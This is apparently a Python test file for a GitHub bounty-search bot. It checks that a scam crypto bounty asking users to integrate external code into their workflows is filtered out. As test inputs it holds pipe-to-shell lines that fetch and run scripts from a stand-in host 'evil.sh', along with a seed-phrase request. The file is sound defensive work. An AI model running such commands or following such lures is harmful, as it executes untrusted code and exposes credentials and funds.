"""Tests de seguridad para bounty_bot.py.

Regresión: el issue #30 de este repo fue creado por el bot a partir de
https://github.com/doomsday-network/bounty-guard/issues/7, un bounty falso
($wDOOM) que pedía integrar código externo en el workflow de GitHub Actions.
Estas pruebas garantizan que dicho contenido quede bloqueado.
"""
import unittest
from unittest.mock import patch, MagicMock

import bounty_bot

# Título exacto del issue #30 (bounty falso de doomsday-network/bounty-guard)
ISSUE_30_TITLE = (
    "[ESCROW BOUNTY] 🔌 2,000 DOOM ($wDOOM on Base) — Integrate BountyGuard "
    "Into Your Public Agent Repo or GitHub Action Workflow!"
)
ISSUE_30_URL = "https://github.com/doomsday-network/bounty-guard/issues/7"
ISSUE_30_BODY = (
    "🛡️ Real On-Chain Escrow... Ver enlace: " + ISSUE_30_URL
)

BENIGN_ITEM = {
    "id": 111,
    "title": "Fix pagination bug in API client",
    "body": "Escrow de $50 USDC disponible al ser mergeado el PR. Gracias!",
    "html_url": "https://github.com/some-org/some-repo/issues/42",
}

SCAM_ITEM = {
    "id": 222,
    "title": ISSUE_30_TITLE,
    "body": ISSUE_30_BODY,
    "html_url": ISSUE_30_URL,
}


def _fake_response(items, status_code=200):
    resp = MagicMock()
    resp.status_code = status_code
    resp.json.return_value = {"items": items}
    return resp


class TestEsMalicioso(unittest.TestCase):
    def test_issue_30_title_is_blocked(self):
        self.assertTrue(bounty_bot.es_malicioso(ISSUE_30_TITLE, ISSUE_30_BODY))

    def test_bounty_guard_url_is_blocked(self):
        self.assertTrue(
            bounty_bot.es_malicioso("Bounty", ISSUE_30_URL)
        )

    def test_wdoom_token_is_blocked(self):
        self.assertTrue(bounty_bot.es_malicioso("2,000 DOOM ($wDOOM on Base)", ""))

    def test_doomsday_org_is_blocked(self):
        self.assertTrue(bounty_bot.es_malicioso("", "ver doomsday-network/bounty-guard"))

    def test_pipe_to_shell_is_blocked(self):
        self.assertTrue(
            bounty_bot.es_malicioso("", "Run curl -sL http://evil.sh | python")
        )
        self.assertTrue(
            bounty_bot.es_malicioso("", "wget http://evil.sh/x | bash")
        )

    def test_seed_phrase_request_is_blocked(self):
        self.assertTrue(
            bounty_bot.es_malicioso("", "Please send your seed phrase to claim")
        )

    def test_benign_bounty_is_allowed(self):
        self.assertFalse(
            bounty_bot.es_malicioso(BENIGN_ITEM["title"], BENIGN_ITEM["body"])
        )

    def test_none_body_is_allowed(self):
        self.assertFalse(bounty_bot.es_malicioso("Normal issue", None))


class TestEsBountySospechoso(unittest.TestCase):
    def test_scam_item_is_blocked(self):
        self.assertTrue(bounty_bot.es_bounty_sospechoso(SCAM_ITEM))

    def test_own_repo_item_is_blocked(self):
        own = dict(BENIGN_ITEM, html_url="https://github.com/alfrexo95/bounty-bot/issues/30")
        self.assertTrue(bounty_bot.es_bounty_sospechoso(own))

    def test_benign_external_item_is_allowed(self):
        self.assertFalse(bounty_bot.es_bounty_sospechoso(BENIGN_ITEM))


class TestBuscarIssuesFiltersScams(unittest.TestCase):
    def test_scam_items_never_reach_results(self):
        with patch("bounty_bot.requests.get") as mock_get:
            mock_get.return_value = _fake_response([SCAM_ITEM, BENIGN_ITEM])
            results = bounty_bot.buscar_issues()
        ids = [r["id"] for r in results]
        self.assertNotIn(SCAM_ITEM["id"], ids)
        self.assertIn(BENIGN_ITEM["id"], ids)

    def test_benign_item_gets_amount_and_platform(self):
        with patch("bounty_bot.requests.get") as mock_get:
            mock_get.return_value = _fake_response([BENIGN_ITEM])
            results = bounty_bot.buscar_issues()
        self.assertEqual(len(results), len(bounty_bot.SEARCH_QUERIES))
        for item in results:
            self.assertEqual(item["_monto"], "$50")
            self.assertIn(item["_plataforma"], ("GitHub Issue", "USDC Escrow"))


if __name__ == "__main__":
    unittest.main()
